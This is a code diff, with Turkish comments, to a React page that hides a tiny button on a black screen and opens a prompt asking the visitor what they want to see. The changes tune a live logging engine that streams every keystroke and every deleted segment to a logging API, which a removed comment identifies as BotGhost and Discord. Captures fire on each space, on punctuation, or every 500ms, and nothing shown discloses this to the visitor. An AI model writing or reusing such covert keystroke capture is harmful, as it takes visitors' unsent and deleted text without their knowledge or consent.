@@ -7,7 +7,7 @@ import { postLogToApi } from '../utils/gardenEngine';
  * - Arkaplan zifiri siyah (#000000). Hiçbir yazı yok.
  * - Sağ altta çok küçük, zayıfça fark edilebilen 6px yuvarlak gizli buton.
  * - Butona tıklanınca "Ne görmek istiyorsun? Söyle. Ciddiyim Ne görmek istiyorsun?" sorusu ve yazı alanı açılır.
- * - Yazılan, silinen ve gönderilen her şey anlık bildirim olarak BotGhost & Discord'a gönderilir.
+ * - Yazılan, silinen ve gönderilen her şey canlı olarak bildirim ile gönderilir.
  */
 export default function LastLetterPage({ onGoHome }) {
   // Device & Auth
@@ -33,7 +33,9 @@ export default function LastLetterPage({ onGoHome }) {
   const allTypedHistoryRef = useRef('');
   const deletedTextHistoryRef = useRef('');
   const prevTextRef = useRef('');
-  const debounceTimerRef = useRef(null);
+  const lastSentTextRef = useRef('');
+  const lastSentTimeRef = useRef(0);
+  const typingTimerRef = useRef(null);
 
   // Detect Client Device
   const detectDevice = useCallback(() => {
@@ -159,11 +161,7 @@ export default function LastLetterPage({ onGoHome }) {
     setIsSecretOpen(true);
     currentStageRef.current = 'Gizli Soru Kutusu Açıldı';
 
-    // Fire dual events to guarantee BotGhost trigger execution
     sendLog('secret_button_clicked', {
-      action: 'Ziyaretçi Sağ Alttaki Nokta Butonuna Tıkladı & Soru Açıldı'
-    });
-    sendLog('last_user_click', {
       clickType: 'Gizli Nokta Buton Tıklaması',
       targetElement: 'BUTTON.secret-dot',
       coordinates: 'Sağ Alt Köşe (12px, 12px)',
@@ -171,13 +169,13 @@ export default function LastLetterPage({ onGoHome }) {
     });
   };
 
-  // Handle Input Text Change (Capture typing, additions, deletions live)
+  // Live Typing Stream Engine (Captures additions, word boundaries, deletions instantly)
   const handleInputChange = (e) => {
     const newVal = e.target.value;
     const oldVal = prevTextRef.current;
     setInputText(newVal);
 
-    // 1. Accumulate all typed characters over time
+    // 1. Accumulate typed characters
     if (newVal.length > oldVal.length) {
       const added = newVal.slice(oldVal.length);
       allTypedHistoryRef.current += added;
@@ -187,7 +185,7 @@ export default function LastLetterPage({ onGoHome }) {
       if (deletedSegment) {
         deletedTextHistoryRef.current += ` [silindi: "${deletedSegment}"]`;
 
-        // IMMEDIATELY Send Deletion Event (0ms delay!)
+        // Immediately send single deletion notification (no rate-limit burst)
         sendLog('secret_input_deleted', {
           letterText: newVal,
           answer: newVal,
@@ -197,42 +195,53 @@ export default function LastLetterPage({ onGoHome }) {
           draftLength: newVal.length,
           action: `✂️ Ziyaretçi Metin Sildi: "${deletedSegment}" (Kalan: "${newVal}")`
         });
-        sendLog('letter_draft_update', {
-          letterText: newVal,
-          answer: newVal,
-          answerInput: newVal,
-          allTypedHistory: allTypedHistoryRef.current || newVal,
-          deletedText: deletedSegment,
-          draftLength: newVal.length,
-          action: `✂️ Ziyaretçi Metin Sildi: "${deletedSegment}" (Kalan: "${newVal}")`
-        });
+        lastSentTextRef.current = newVal;
+        lastSentTimeRef.current = Date.now();
       }
     }
 
     prevTextRef.current = newVal;
 
-    // 3. Fast Debounced Live Webhook Logging (250ms after typing)
-    if (debounceTimerRef.current) clearTimeout(debounceTimerRef.current);
-    debounceTimerRef.current = setTimeout(() => {
-      sendLog('secret_input_typed', {
-        letterText: newVal,
-        answer: newVal,
-        answerInput: newVal,
-        allTypedHistory: allTypedHistoryRef.current || newVal,
-        deletedText: deletedTextHistoryRef.current || null,
-        draftLength: newVal.length,
-        action: `✍️ Ziyaretçi Yazıyor: "${newVal}"`
-      });
-      sendLog('letter_draft_update', {
-        letterText: newVal,
-        answer: newVal,
-        answerInput: newVal,
-        allTypedHistory: allTypedHistoryRef.current || newVal,
-        deletedText: deletedTextHistoryRef.current || null,
-        draftLength: newVal.length,
-        action: `✍️ Ziyaretçi Yazıyor: "${newVal}"`
-      });
-    }, 250);
+    // 3. Live Streaming Engine: Trigger instantly on space/punctuation or every 500ms while typing
+    const isSpaceOrPunctuation = /\s|[.,!?]$/.test(newVal);
+    const timeSinceLastSend = Date.now() - lastSentTimeRef.current;
+
+    if (newVal !== lastSentTextRef.current && newVal.trim().length > 0) {
+      if (isSpaceOrPunctuation || timeSinceLastSend >= 500) {
+        if (typingTimerRef.current) clearTimeout(typingTimerRef.current);
+        lastSentTextRef.current = newVal;
+        lastSentTimeRef.current = Date.now();
+
+        sendLog('secret_input_typed', {
+          letterText: newVal,
+          answer: newVal,
+          answerInput: newVal,
+          allTypedHistory: allTypedHistoryRef.current || newVal,
+          deletedText: deletedTextHistoryRef.current || null,
+          draftLength: newVal.length,
+          action: `✍️ Ziyaretçi Yazıyor: "${newVal}"`
+        });
+      } else {
+        // Fallback timer: send 350ms after typing pauses
+        if (typingTimerRef.current) clearTimeout(typingTimerRef.current);
+        typingTimerRef.current = setTimeout(() => {
+          if (prevTextRef.current !== lastSentTextRef.current && prevTextRef.current.trim().length > 0) {
+            lastSentTextRef.current = prevTextRef.current;
+            lastSentTimeRef.current = Date.now();
+
+            sendLog('secret_input_typed', {
+              letterText: prevTextRef.current,
+              answer: prevTextRef.current,
+              answerInput: prevTextRef.current,
+              allTypedHistory: allTypedHistoryRef.current || prevTextRef.current,
+              deletedText: deletedTextHistoryRef.current || null,
+              draftLength: prevTextRef.current.length,
+              action: `✍️ Ziyaretçi Yazıyor: "${prevTextRef.current}"`
+            });
+          }
+        }, 350);
+      }
+    }
   };
 
   // Handle Form Submission
@@ -240,20 +249,9 @@ export default function LastLetterPage({ onGoHome }) {
     if (e) e.preventDefault();
     if (!inputText.trim()) return;
 
-    if (debounceTimerRef.current) clearTimeout(debounceTimerRef.current);
+    if (typingTimerRef.current) clearTimeout(typingTimerRef.current);
 
-    // Fire dual events to guarantee BotGhost submission triggers
     sendLog('secret_input_submitted', {
-      letterText: inputText,
-      answer: inputText,
-      answerInput: inputText,
-      allTypedHistory: allTypedHistoryRef.current || inputText,
-      deletedText: deletedTextHistoryRef.current || null,
-      draftLength: inputText.length,
-      action: `🔥 GİZLİ SORUYA CEVAP GÖNDERİLDİ: "${inputText}"`
-    });
-
-    sendLog('letter_submitted', {
       letterText: inputText,
       answer: inputText,
       answerInput: inputText,
